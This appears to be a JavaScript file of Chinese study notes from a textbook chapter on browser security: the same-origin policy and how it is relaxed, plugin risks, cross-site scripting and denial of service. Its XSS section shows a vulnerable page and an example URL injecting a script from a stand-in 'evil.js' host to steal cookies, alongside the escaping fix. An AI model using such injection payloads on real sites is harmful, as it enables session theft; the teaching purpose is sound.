 * 另一个服务器中文档的窗口或窗体，都是同源策略适用的范围。如果脚本打开了一个窗口，脚本也可以关闭它，但不能以任何方式查看窗口内部。
 * 
 * 同源策略还应用于使用XMLHttpRequest生成的HTTP请求（参见18章）。这个对象允许客户端JavaScript生成任意的HTTP请求到脚本所属文档的Web服务器，但
 * 是不允许脚本和其他Web服务器通信。
 * 
 * 对于防止脚本窃取私有的信息来说，同源策略是必需的。如果没有这一限制，恶意脚本（通过防火墙载入到安全的公司内网的浏览器中）可能会打开一个空的窗
 * 口，欺骗用户进入并使用这个窗口在内网上浏览文件。恶意脚本就能读取窗口的内容并将其发送回自己的服务器。同源策略防止了这种行为。
 * 
 * 不严格的同源策略
 * 
 * 1. document.doamin
 * 同源策略给那些使用了多个子域的大站点带来一些问题。例如，来自“home.example.com”的文档里的脚本想要合法地读取从“developer.example.com”载入
 * 的文档的属性，或者来自“orders.example.com”的脚本可能需要读“catalog.example.com”上的文档属性。为了支持这种类型的多域名站点，可以使用Document
 * 对象的domain属性。在默认情况下，属性domain存放的是载入文档的服务器的主机名。可以设置这一属性，不过使用的字符串必须具有有效的域前缀或它本身。
 * 因此，如果一个domain属性的初始值是字符串“home.example.com”，就可以把它设置为字符串“example.com”，但是不能设置为“home.example”或“ample.com”。
 * 另外，domain值中必须有一个点号，不能把它设置为“com”或其他顶级域名。
 * 
 * 如果两个窗口（或窗体）包含的脚本把domain设置成了相同的值，那么这两个窗口就不再受同源策略的约束，它们可以相互读取对方的属性。例如，从“order.example.com”
 * 和“catalog.example.com”载入的文档中的脚本可以把他们的document.domain属性设置为“example.com”，这样一来，这些文档就有了同源性，可以相互读取属性。
 * 
 * 2. cross-origin resource sharing：修改header头信息（Origin和Access-Control-Allow-Origin）
 * 不严格的同源策略的第二项技术已经标准化为：跨域资源共享（Cross-Origin Resource Sharing， 参见 http://www.w3.org/TR/cors）。这个标准草案
 * 用新的“Origin:”请求头和新的Access-Control-Allow-Origin响应头来扩展HTTP。它允许服务器用头信息显式地列出源，或使用通配符来匹配所有的源并并
 * 允许由任何地址请求文件。类似Firefox 3.5和Safari 4的浏览器可以使用这种新的头信息来允许跨域HTTP请求，这样XMLHttpRequest就不会被同源策略限制。
 * 
 * 3. cros-document messaging
 * 另一种新技术，叫做跨文档信息（cross-document messaging），允许来自同一个文档的脚本可以传递文本消息到另一个文档里的脚本，而不管脚本的来源是否
 * 不同。调用Window对象上的postMessage()方法，可以异步传递消息事件（可以用window.onmessage事件处理程序函数来处理它）到窗口的文档里。一个文档里
 * 的脚本还是不能调用在其它文档里的方法和读取属性，但它们可以用这种消息传递技术来实现安全的通信。（参见22.3节）
 */

/**
 * 脚本化插件和ActiveX控件
 * 
 * 尽管核心的JavaScript语言与基本的客户端对象模型缺乏大多数恶意代码所需要的文件系统功能和网络功能，但情况并不像看上去的那么简单。在很多Web浏览器
 * 中，JavaScript亦被用做很多软件或插件的“脚本引擎”，这样的组件有IE中的ActiveX控件和其他浏览器的插件。Flash和Java插件是最常安装的例子，它们为
 * 客户端脚本提供了非常强大的特性。
 * 
 * 脚本化的ActiveX控件和插件的能力也存在安全性的问题。例如，Java applet具有访问底层网络的能力。Java安全“沙箱”阻止applet和载入它的服务器之外的
 * 任何服务器进行通信，因此，这并未打开一个安全漏洞。但是，它暴露了一个根本的问题：如果插件是可以脚本化的，我们不仅是无条件相信Web浏览器的安全架构，
 * 还要相信插件的安全架构。
 * 实际上，Java和Flash插件看上去具有健壮的安全性，并且不会为客户端JavaScript引来安全问题。然后，ActiveX脚本化有着更加糟糕的历史遗留问题。IE浏览器
 * 已经能够访问各种各样的脚本化ActiveX控件，而这些控件是Windows操作系统的一部分，并且在过去，操作系统还存在很多可被控件利用的安全漏洞。
 */

/**
 * 跨站脚本
 * 
 * 跨站脚本（Cross-site scripting），或者叫做XSS，这个术语用来表示一类安全问题，也就是攻击者向目标Web站点注入HTML标签或脚本。防止XSS攻击是服务器端
 * Web开发者的一项基本工作。然而，客户端JavaScript程序员也必须意识到或者能够预防跨域脚本。
 * 
 * 如果Web页面动态地生成文档内容，并且这些文档内容是基于用户提交的数据的，而并没有通过从中移除任何嵌入的HTML标签来“消毒”的话，那么这个Web页面很容易
 * 遭到跨站脚本攻击。来看一个小例子，考虑如下的Web页面，它使用JavaScript通过用户的名字来向用户问好：
 * 
 * <script>
 * var name = decodeURIComponent(window.location.search.substring(1)) || "";
 * document.write("hello" + name);
 * </script>
 * 这两行脚本使用window.location.search来获得它们自己的URL中以“?”开始的部分。它使用document.write()来向文档添加动态生成的内容。这个页面专门通过
 * 如下的一个URL来调用：
 * 
 * http://www.example.com/greet.html?David
 * 这么使用的时候，他会显示文本“hello David”。但考虑一下，当用下面的URL来调用它，会发生什么情况：
 * 
 * http://www.example.com/greet.html?%3Cscript%3Ealert('David')%3c/script%3E
 * 只用这个URL，脚本就会动态地生成另一个脚本（%3C和%3E是一个尖括号的编码）。这个例子中，注入的脚本只显示一个对话框，这还是相对较好的情况。但是，如果
 * 考虑一下情况：
 * 
 * http://siteA/greet.html?name=%3Cscript src=siteB/evil.js%3E%3C/script%3E
 * 之所以叫做跨站脚本攻击，就是因为它涉及多个站点。站点B（或者站点C）包含一个专门构造的到站点A的链接，它会注入一个来自站点B的脚本。脚本eval.js驻留在
 * 恶意站点B中，但现在，它嵌入到站点A中，并且可以对站点A的内容进行任何想要的操作。它可能损坏这个页面或者使其不能正常工作（例如，启动下一节所要介绍的
 * 拒绝服务攻击）。这个可能会对站点A的用户带来不少坏处。更危险的是，恶意脚本可以读取站点A所存储的cookie（可能是统计数据或者其他的个人验证信息），然后
 * 把数据发送回站点B。注入的脚本甚至可以诱骗用户击键并数据发送回站点B。
 * 
 * 通常，防止XSS攻击的方式是，在使用任何不可信的数据来动态地创建文档内容之前，从中移除HTML标签。可以通过添加如下一行代码来移除`<script>`标签两边的
 * 尖括号，从而修复前面给出的greet.html文件：
 * 
 * name = name.replace(/</g, "&lt;").replace(/>/g, "&gt;");
 * 
 * 上面的简单代码替换把字符串中所有的尖括号替换成它们对应的HTML实体，也就是说，将字符串中任意HTML标签进行转义和过滤删除（deactivate）处理。IE8定义了
 * 一个更加微秒的toStaticHTML()方法，可以移除`<script>`标签（和其他潜在的可执行内容）而不修改不可执行的HTML。toStaticHTML()是不标准的，但在javaScript
 * 核心代码中自己实现一个HTML安全函数也非常简单。
 * 
 * HTML5的内容安全策略则更进一步，它为`<iframe>`元素定义了一个sandbox属性。在实现之后，它允许显示不可信的内容，并自动禁用脚本。
 * 
 * 跨站脚本使得一个有害的漏洞能够立足于Web的架构之中。深入理解这些跨站脚本的知识是值得的，但是更深入超出了本书的范围。有很多在线资源可以帮助你预防跨站
 * 脚本带来的危险。其中一个最重要的参考资料出自于原始CERT Advisory: http://www.cert.org/advisories/CA-2000-02.html。
 */

/**
 * 拒绝服务攻击
 * 
 * 同源策略和其他的安全限制可以很好地预防恶意代码毁坏数据或防止侵犯隐私这种问题。然而，它们并不能防止另外一种攻击：拒绝服务攻击。这种攻击手法非常暴力。
 * 如果访问了启用JavaScript功能的一个恶意Web站点，这个站点可以使用一个alert()对话框的无限循环占用浏览器，或者用一个无限循环或没有意义的计算来占用CPU。
 * 
 * 某些浏览器可以检测运行时间很长的脚本，并且让用户选择终止它们。但是恶意脚本可以利用window.setInterval()这种方法占用CPU，并通过分配很多的内存来攻击
 * 你的系统。Web浏览器并没有通用的办法来防止这种笨重的攻击手法。实际上，由于没有人会返回一个滥用这种脚本的网站，因此这在Web上不是一个常见的问题。
 */




/**
 * 客户端框架
 */



